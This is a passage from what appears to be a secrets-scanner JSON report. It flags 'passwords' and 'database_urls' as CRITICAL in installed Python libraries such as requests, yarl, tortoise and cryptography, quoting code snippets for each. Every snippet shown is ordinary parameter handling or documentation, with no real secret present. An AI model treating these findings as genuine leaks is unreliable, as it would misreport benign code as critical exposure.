            "context": ".fragment),\n        )\n\n    def to_text(self, with_password=False):\n        # type: (bool) -> Text\n        \"\"\"Render "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 1746,
            "severity": "CRITICAL",
            "context": "assword).\"\n\n        Args (bool):\n            with_password: Whether or not to include the password in the URL\n       "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 1842,
            "severity": "CRITICAL",
            "context": ": (bool) -> Text\n        return self.to_text(with_password=includeSecrets)\n\n    def __dir__(self):\n        # type: () -> Seq"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 2072,
            "severity": "CRITICAL",
            "context": "     return self._url\n\n    def to_text(self, with_password=False):\n        # type: (bool) -> Text\n        \"Passthrou"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 2403,
            "severity": "CRITICAL",
            "context": ": (bool) -> Text\n        return self.to_text(with_password=includeSecrets)\n\n    def __dir__(self):\n        # type: () -> Seq"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/auth.py",
            "type": "passwords",
            "line": 53,
            "severity": "CRITICAL",
            "context": "   category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(userna"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/auth.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "tin1\")\n\n    if isinstance(password, str):\n        password = password.encode(\"latin1\")\n\n    authstr = \"Basic \" + to_native_strin"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/auth.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all("
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/auth.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/sessions.py",
            "type": "passwords",
            "line": 322,
            "severity": "CRITICAL",
            "context": "thorization\"]\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, pa"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/sessions.py",
            "type": "passwords",
            "line": 328,
            "severity": "CRITICAL",
            "context": "f not scheme.startswith(\"https\") and username and password:\n            headers[\"Proxy-Authorization\"] = _basic_auth_str(username, "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/adapters.py",
            "type": "passwords",
            "line": 281,
            "severity": "CRITICAL",
            "context": "ower().startswith(\"socks\"):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] ="
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/adapters.py",
            "type": "passwords",
            "line": 285,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                num_pools=self._pool_connections,"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/adapters.py",
            "type": "passwords",
            "line": 606,
            "severity": "CRITICAL",
            "context": "       \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers[\"Proxy-"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/main.py",
            "type": "passwords",
            "line": 451,
            "severity": "CRITICAL",
            "context": "   ssl_certfile=ssl_certfile,\n        ssl_keyfile_password=ssl_keyfile_password,\n        ssl_version=ssl_version,\n        ssl_cert"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/main.py",
            "type": "passwords",
            "line": 555,
            "severity": "CRITICAL",
            "context": "   ssl_certfile=ssl_certfile,\n        ssl_keyfile_password=ssl_keyfile_password,\n        ssl_version=ssl_version,\n        ssl_cert"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/config.py",
            "type": "passwords",
            "line": 113,
            "severity": "CRITICAL",
            "context": "xt:\n    ctx = ssl.SSLContext(ssl_version)\n    get_password = (lambda: password) if password else None\n    ctx.load_cert"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/config.py",
            "type": "passwords",
            "line": 263,
            "severity": "CRITICAL",
            "context": "_certfile = ssl_certfile\n        self.ssl_keyfile_password = ssl_keyfile_password\n        self.ssl_version = ssl_version\n        se"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvicorn/config.py",
            "type": "passwords",
            "line": 404,
            "severity": "CRITICAL",
            "context": "      certfile=self.ssl_certfile,\n                password=self.ssl_keyfile_password,\n                ssl_version=self.ssl_version,\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/prompt.py",
            "type": "passwords",
            "line": 71,
            "severity": "CRITICAL",
            "context": "r)\n            else prompt\n        )\n        self.password = password\n        if choices is not None:\n            self."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/prompt.py",
            "type": "passwords",
            "line": 143,
            "severity": "CRITICAL",
            "context": " prompt,\n            console=console,\n            password=password,\n            choices=choices,\n            case_sen"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/prompt.py",
            "type": "passwords",
            "line": 211,
            "severity": "CRITICAL",
            "context": "\n        \"\"\"\n        return console.input(prompt, password=password, stream=stream)\n\n    def check_choice(self, value:"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/prompt.py",
            "type": "passwords",
            "line": 380,
            "severity": "CRITICAL",
            "context": "umber={result}\")\n\n        while True:\n            password = Prompt.ask(\n                \"Please enter a password [cyan](m"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/prompt.py",
            "type": "passwords",
            "line": 387,
            "severity": "CRITICAL",
            "context": "ompt.invalid]password too short\")\n        print(f\"password={password!r}\")\n\n        fruit = Prompt.ask(\"Enter a fruit\", cho"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/console.py",
            "type": "passwords",
            "line": 2151,
            "severity": "CRITICAL",
            "context": "ires a str prompt). Defaults to True.\n            password: (bool, optional): Hide typed text. Defaults to False.\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/console.py",
            "type": "passwords",
            "line": 2159,
            "severity": "CRITICAL",
            "context": "t, markup=markup, emoji=emoji, end=\"\")\n        if password:\n            result = getpass(\"\", stream=stream)\n        else:\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpcore/_models.py",
            "type": "passwords",
            "line": 510,
            "severity": "CRITICAL",
            "context": "= enforce_bytes(auth[0], name=\"auth\")\n            password = enforce_bytes(auth[1], name=\"auth\")\n            userpass = username + b\""
          },
          {
            "file": "test_env/lib/python3.12/site-packages/prometheus_client/exposition.py",
            "type": "passwords",
            "line": 454,
            "severity": "CRITICAL",
            "context": ",\n        username: Optional[str] = None,\n        password: Optional[str] = None,\n) -> Callable[[], None]:\n    \"\"\"Handler t"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
            "type": "passwords",
            "line": 162,
            "severity": "CRITICAL",
            "context": "         # otherwise blank.\n            username, password = decoded.split(\":\", 1)\n        except ValueError:\n            rais"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
            "type": "passwords",
            "line": 256,
            "severity": "CRITICAL",
            "context": "found in the `.netrc` file.\")\n    login, account, password = auth_from_netrc\n\n    # TODO(PY311): username = login or account\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiohttp/client_reqrep.py",
            "type": "passwords",
            "line": 1027,
            "severity": "CRITICAL",
            "context": "asic auth info\n        if url.raw_user or url.raw_password:\n            self.auth = helpers.BasicAuth(url.user or \"\", url.password "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 110,
            "severity": "CRITICAL",
            "context": "ion[str, None]\n    user: Union[str, None]\n    raw_password: Union[str, None]\n    password: Union[str, None]\n    raw_host"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 111,
            "severity": "CRITICAL",
            "context": "str, None]\n    raw_password: Union[str, None]\n    password: Union[str, None]\n    raw_host: Union[str, None]\n    host: Un"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 179,
            "severity": "CRITICAL",
            "context": "ername) if username else username\n            raw_password = REQUOTER(password) if password else password\n            netloc = ma"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 223,
            "severity": "CRITICAL",
            "context": "  authority: str,\n    user: Union[str, None],\n    password: Union[str, None],\n    host: str,\n    port: Union[int, None],"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 384,
            "severity": "CRITICAL",
            "context": "\",\n        user: Union[str, None] = None,\n        password: Union[str, None] = None,\n        host: str = \"\",\n        por"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 1075,
            "severity": "CRITICAL",
            "context": "str):\n            user = QUOTER(user)\n            password = self.raw_password\n        else:\n            raise TypeError(\"Invali"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 1084,
            "severity": "CRITICAL",
            "context": "ery, self._fragment)\n\n    def with_password(self, password: Union[str, None]) -> \"URL\":\n        \"\"\"Return a new URL with"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 1096,
            "severity": "CRITICAL",
            "context": "      elif isinstance(password, str):\n            password = QUOTER(password)\n        else:\n            raise TypeError(\"Invali"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_url.py",
            "type": "passwords",
            "line": 1449,
            "severity": "CRITICAL",
            "context": " user = human_quote(self.user, \"#/:?@[]\")\n        password = human_quote(self.password, \"#/:?@[]\")\n        if (host := self.host) and \":\""
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_parse.py",
            "type": "passwords",
            "line": 115,
            "severity": "CRITICAL",
            "context": "        username: Union[str, None] = None\n        password: Union[str, None] = None\n        hostinfo = netloc\n    else:\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_parse.py",
            "type": "passwords",
            "line": 119,
            "severity": "CRITICAL",
            "context": ".rpartition(\"@\")\n        username, have_password, password = userinfo.partition(\":\")\n        if not have_password:\n            pass"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_parse.py",
            "type": "passwords",
            "line": 120,
            "severity": "CRITICAL",
            "context": "ord = userinfo.partition(\":\")\n        if not have_password:\n            password = None\n\n    if \"[\" in hostinfo:\n        _, _, bra"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_parse.py",
            "type": "passwords",
            "line": 161,
            "severity": "CRITICAL",
            "context": "\ndef make_netloc(\n    user: Union[str, None],\n    password: Union[str, None],\n    host: Union[str, None],\n    port: Unio"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/yarl/_parse.py",
            "type": "passwords",
            "line": 185,
            "severity": "CRITICAL",
            "context": "ser = QUOTER(user)\n        if encode:\n            password = QUOTER(password)\n        user = f\"{user}:{password}\"\n    elif user"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 47,
            "severity": "CRITICAL",
            "context": "  scheme: str\n        user: Optional[str]\n        password: Optional[str]\n        ipv4: Optional[str]\n        ipv6: Optiona"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 193,
            "severity": "CRITICAL",
            "context": " str,\n        user: Optional[str] = None,\n        password: Optional[str] = None,\n        host: Optional[str] = None,\n     "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 205,
            "severity": "CRITICAL",
            "context": "me = scheme\n        self.user = user\n        self.password = password\n        self.host = host\n        self.tld = tld\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 220,
            "severity": "CRITICAL",
            "context": " str,\n        user: Optional[str] = None,\n        password: Optional[str] = None,\n        host: str,\n        port: Optional"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 231,
            "severity": "CRITICAL",
            "context": "scheme=scheme,\n            user=user,\n            password=password,\n            host=host,\n            port=port,\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 300,
            "severity": "CRITICAL",
            "context": "me'],\n            user=parts['user'],\n            password=parts['password'],\n            host=host,\n            tld"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 462,
            "severity": "CRITICAL",
            "context": "              user=parts['user'],\n                password=parts['password'],\n                path=parts['path'],\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/v1/networks.py",
            "type": "passwords",
            "line": 476,
            "severity": "CRITICAL",
            "context": "              user=parts['user'],\n                password=parts['password'],\n                host=host_part['host']"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "type": "passwords",
            "line": 864,
            "severity": "CRITICAL",
            "context": "entials: Any) -> bool:\n    try:\n        username, password = credentials\n    except (TypeError, ValueError):\n        retur"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "type": "passwords",
            "line": 928,
            "severity": "CRITICAL",
            "context": "> bool:\n            try:\n                expected_password = credentials_dict[username]\n            except KeyError:\n                retu"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "type": "passwords",
            "line": 957,
            "severity": "CRITICAL",
            "context": "turn response\n\n        try:\n            username, password = parse_authorization_basic(authorization)\n        except InvalidHeader:\n            respons"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "type": "passwords",
            "line": 650,
            "severity": "CRITICAL",
            "context": "entials: Any) -> bool:\n    try:\n        username, password = credentials\n    except (TypeError, ValueError):\n        retur"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "type": "passwords",
            "line": 714,
            "severity": "CRITICAL",
            "context": "> bool:\n            try:\n                expected_password = credentials_dict[username]\n            except KeyError:\n                retu"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
            "type": "passwords",
            "line": 743,
            "severity": "CRITICAL",
            "context": "turn response\n\n        try:\n            username, password = parse_authorization_basic(authorization)\n        except InvalidHeader:\n            respons"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/auth.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "            )\n\n        try:\n            username, password = parse_authorization_basic(authorization)\n        except InvalidHeader:\n            return "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/legacy/auth.py",
            "type": "passwords",
            "line": 173,
            "severity": "CRITICAL",
            "context": "> bool:\n            try:\n                expected_password = credentials_dict[username]\n            except KeyError:\n                retu"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/starlette/__init__.py",
            "type": "database_urls",
            "line": 16,
            "severity": "CRITICAL",
            "context": "e = None,\n    config_file: str | None = None,\n    db_url: str | None = None,\n    modules: dict[str, Iterable[st"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/starlette/__init__.py",
            "type": "database_urls",
            "line": 67,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/starlette/__init__.py",
            "type": "database_urls",
            "line": 84,
            "severity": "CRITICAL",
            "context": "oise.init(config=config, config_file=config_file, db_url=db_url, modules=modules)\n        logger.info(\"Tortoise-OR"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/quart/__init__.py",
            "type": "database_urls",
            "line": 18,
            "severity": "CRITICAL",
            "context": "e = None,\n    config_file: str | None = None,\n    db_url: str | None = None,\n    modules: dict[str, Iterable[st"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/quart/__init__.py",
            "type": "database_urls",
            "line": 70,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/quart/__init__.py",
            "type": "database_urls",
            "line": 88,
            "severity": "CRITICAL",
            "context": "oise.init(config=config, config_file=config_file, db_url=db_url, modules=modules)\n        logger.info(\"Tortoise-OR"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/quart/__init__.py",
            "type": "database_urls",
            "line": 105,
            "severity": "CRITICAL",
            "context": "          config=config, config_file=config_file, db_url=db_url, modules=modules\n            )\n            await T"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/test/__init__.py",
            "type": "database_urls",
            "line": 108,
            "severity": "CRITICAL",
            "context": "zer(\n    modules: Iterable[str | ModuleType],\n    db_url: str | None = None,\n    app_label: str = \"models\",\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/test/__init__.py",
            "type": "database_urls",
            "line": 116,
            "severity": "CRITICAL",
            "context": "List of modules to look for models in.\n    :param db_url: The db_url, defaults to ``sqlite://:memory``.\n    :pa"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/test/__init__.py",
            "type": "database_urls",
            "line": 172,
            "severity": "CRITICAL",
            "context": "EST_MODULES\", \"tests.testmodels\")).split(\",\")\n    db_url = _os.environ.get(\"TORTOISE_TEST_DB\", \"sqlite://:memory:\")\n    app_la"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/test/__init__.py",
            "type": "database_urls",
            "line": 176,
            "severity": "CRITICAL",
            "context": "LES envvar not defined\")\n    initializer(modules, db_url=db_url, app_label=app_label)\n\n\nclass SimpleTestCase(unitt"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/test/__init__.py",
            "type": "database_urls",
            "line": 459,
            "severity": "CRITICAL",
            "context": ", **kwargs) -> T:\n            await Tortoise.init(db_url=MEMORY_SQLITE, modules={\"models\": ms})\n            await Tortois"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
            "type": "database_urls",
            "line": 90,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
            "type": "database_urls",
            "line": 117,
            "severity": "CRITICAL",
            "context": ",\n        config_file: str | None = None,\n        db_url: str | None = None,\n        modules: dict[str, Iterabl"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
            "type": "database_urls",
            "line": 128,
            "severity": "CRITICAL",
            "context": "      self.config_file = config_file\n        self.db_url = db_url\n        self.modules = modules\n        self.gener"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
            "type": "database_urls",
            "line": 157,
            "severity": "CRITICAL",
            "context": "        config_file=self.config_file,\n            db_url=self.db_url,\n            modules=self.modules,\n            use"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
            "type": "database_urls",
            "line": 194,
            "severity": "CRITICAL",
            "context": "e = None,\n    config_file: str | None = None,\n    db_url: str | None = None,\n    modules: dict[str, Iterable[st"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/fastapi/__init__.py",
            "type": "database_urls",
            "line": 247,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/sanic/__init__.py",
            "type": "database_urls",
            "line": 16,
            "severity": "CRITICAL",
            "context": "e = None,\n    config_file: str | None = None,\n    db_url: str | None = None,\n    modules: dict[str, Iterable[st"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/sanic/__init__.py",
            "type": "database_urls",
            "line": 67,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/sanic/__init__.py",
            "type": "database_urls",
            "line": 83,
            "severity": "CRITICAL",
            "context": "oise.init(config=config, config_file=config_file, db_url=db_url, modules=modules)\n        logger.info(\n           "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/blacksheep/__init__.py",
            "type": "database_urls",
            "line": 19,
            "severity": "CRITICAL",
            "context": "e = None,\n    config_file: str | None = None,\n    db_url: str | None = None,\n    modules: dict[str, Iterable[st"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/blacksheep/__init__.py",
            "type": "database_urls",
            "line": 71,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/blacksheep/__init__.py",
            "type": "database_urls",
            "line": 91,
            "severity": "CRITICAL",
            "context": "oise.init(config=config, config_file=config_file, db_url=db_url, modules=modules)\n        logger.info(\"Tortoise-OR"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/aiohttp/__init__.py",
            "type": "database_urls",
            "line": 16,
            "severity": "CRITICAL",
            "context": "e = None,\n    config_file: str | None = None,\n    db_url: str | None = None,\n    modules: dict[str, Iterable[st"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/aiohttp/__init__.py",
            "type": "database_urls",
            "line": 67,
            "severity": "CRITICAL",
            "context": "ing config with\n        same format as above.\n    db_url:\n        Use a DB_URL string. See :ref:`db_url`\n    modules:\n "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/contrib/aiohttp/__init__.py",
            "type": "database_urls",
            "line": 83,
            "severity": "CRITICAL",
            "context": "oise.init(config=config, config_file=config_file, db_url=db_url, modules=modules)\n        logger.info(f\"Tortoise-O"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/asyncpg/client.py",
            "type": "passwords",
            "line": 61,
            "severity": "CRITICAL",
            "context": ":\n            self._pool = await self.create_pool(password=self.password, **self._template)\n            self.log.debug(\"Cre"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/mssql/client.py",
            "type": "passwords",
            "line": 46,
            "severity": "CRITICAL",
            "context": "f\"DRIVER={driver};SERVER={host},{port};UID={user};PWD={password};\"\n\n    def _in_transaction(self) -> TransactionCont"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/base_postgres/client.py",
            "type": "passwords",
            "line": 71,
            "severity": "CRITICAL",
            "context": "(**kwargs)\n\n        self.user = user\n        self.password = password\n        self.database = database\n        self.hos"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/psycopg/client.py",
            "type": "passwords",
            "line": 85,
            "severity": "CRITICAL",
            "context": "elf.port,\n            user=self.user,\n            password=self.password,\n            dbname=self.database if with_db else "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/base/config_generator.py",
            "type": "database_urls",
            "line": 132,
            "severity": "CRITICAL",
            "context": "gres\"] = DB_LOOKUP[\"asyncpg\"]\n\n\ndef expand_db_url(db_url: str, testing: bool = False) -> dict:\n    url = urlpars"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/base/config_generator.py",
            "type": "database_urls",
            "line": 187,
            "severity": "CRITICAL",
            "context": "\"credentials\": params}\n\n\ndef generate_config(\n    db_url: str,\n    app_modules: dict[str, Iterable[str | ModuleT"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/client.py",
            "type": "passwords",
            "line": 55,
            "severity": "CRITICAL",
            "context": "gs)\n        self.user = user.upper()\n        self.password = password\n        dbq = f\"{host}:{port}\"\n        if self.da"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/client.py",
            "type": "passwords",
            "line": 59,
            "severity": "CRITICAL",
            "context": "self.dsn = f\"DRIVER={driver};DBQ={dbq};UID={user};PWD={password};\"\n\n    def _in_transaction(self) -> TransactionCont"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/mysql/client.py",
            "type": "passwords",
            "line": 91,
            "severity": "CRITICAL",
            "context": "(**kwargs)\n\n        self.user = user\n        self.password = password\n        self.database = database\n        self.hos"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/backends/mysql/client.py",
            "type": "passwords",
            "line": 126,
            "severity": "CRITICAL",
            "context": "\n            self._pool = await mysql.create_pool(password=self.password, **self._template)\n\n            if isinstance(self"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/_oid.py",
            "type": "passwords",
            "line": 223,
            "severity": "CRITICAL",
            "context": "2.5.29.32.0\")\n\n\nclass AttributeOID:\n    CHALLENGE_PASSWORD = ObjectIdentifier(\"1.2.840.113549.1.9.7\")\n    UNSTRUCTURED_NAME = Obj"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/_oid.py",
            "type": "passwords",
            "line": 347,
            "severity": "CRITICAL",
            "context": "ID.NONCE: \"OCSPNonce\",\n    AttributeOID.CHALLENGE_PASSWORD: \"challengePassword\",\n}\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
            "type": "passwords",
            "line": 64,
            "severity": "CRITICAL",
            "context": "ySerializationEncryption):\n    def __init__(self, password: bytes):\n        if not isinstance(password, bytes) or len"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
            "type": "passwords",
            "line": 68,
            "severity": "CRITICAL",
            "context": "Password must be 1 or more bytes.\")\n\n        self.password = password\n\n\nclass NoEncryption(KeySerializationEncryption):"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
            "type": "passwords",
            "line": 140,
            "severity": "CRITICAL",
            "context": "gorithm=algorithm,\n        )\n\n    def build(self, password: bytes) -> KeySerializationEncryption:\n        if not isi"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
            "type": "passwords",
            "line": 157,
            "severity": "CRITICAL",
            "context": "     self,\n        format: PrivateFormat,\n        password: bytes,\n        *,\n        kdf_rounds: int | None,\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
            "type": "passwords",
            "line": 164,
            "severity": "CRITICAL",
            "context": "    ):\n        self._format = format\n        self.password = password\n\n        self._kdf_rounds = kdf_rounds\n        se"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/serialization/ssh.py",
            "type": "passwords",
            "line": 50,
            "severity": "CRITICAL",
            "context": "t_supported = False\n\n    def _bcrypt_kdf(\n        password: bytes,\n        salt: bytes,\n        desired_key_bytes: i"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/serialization/ssh.py",
            "type": "passwords",
            "line": 798,
            "severity": "CRITICAL",
            "context": "ate_key(\n    private_key: SSHPrivateKeyTypes,\n    password: bytes,\n    encryption_algorithm: KeySerializationEncrypt"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/serialization/ssh.py",
            "type": "passwords",
            "line": 816,
            "severity": "CRITICAL",
            "context": " parameters\n    f_kdfoptions = _FragList()\n    if password:\n        ciphername = _DEFAULT_CIPHER\n        blklen = _SSH_CIPHERS[c"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/util/ssl_.py",
            "type": "passwords",
            "line": 442,
            "severity": "CRITICAL",
            "context": "SLContext.load_verify_locations().\n    :param key_password:\n        Optional password if the keyfile is encrypted.\n    :param "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/contrib/socks.py",
            "type": "passwords",
            "line": 116,
            "severity": "CRITICAL",
            "context": "_socks_options[\"username\"],\n                proxy_password=self._socks_options[\"password\"],\n                proxy_rdns=self._socks"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 490,
            "severity": "CRITICAL",
            "context": " isinstance(password, bytes):\n                    password = password.encode(\"utf-8\")  # type: ignore[assignment]\n              "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/contrib/emscripten/connection.py",
            "type": "passwords",
            "line": 219,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/connectors/pyodbc.py",
            "type": "passwords",
            "line": 122,
            "severity": "CRITICAL",
            "context": "onnectors.append(\"UID=%s\" % user)\n                pwd = keys.pop(\"password\", \"\")\n                if pwd:\n           "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/sqlalchemy/connectors/pyodbc.py",
            "type": "passwords",
            "line": 123,
            "severity": "CRITICAL",
            "context": "pwd = keys.pop(\"password\", \"\")\n                if pwd:\n                    connectors.append(\"PWD=%s\" % pwd)\n            else:\n                a"
          },
          {
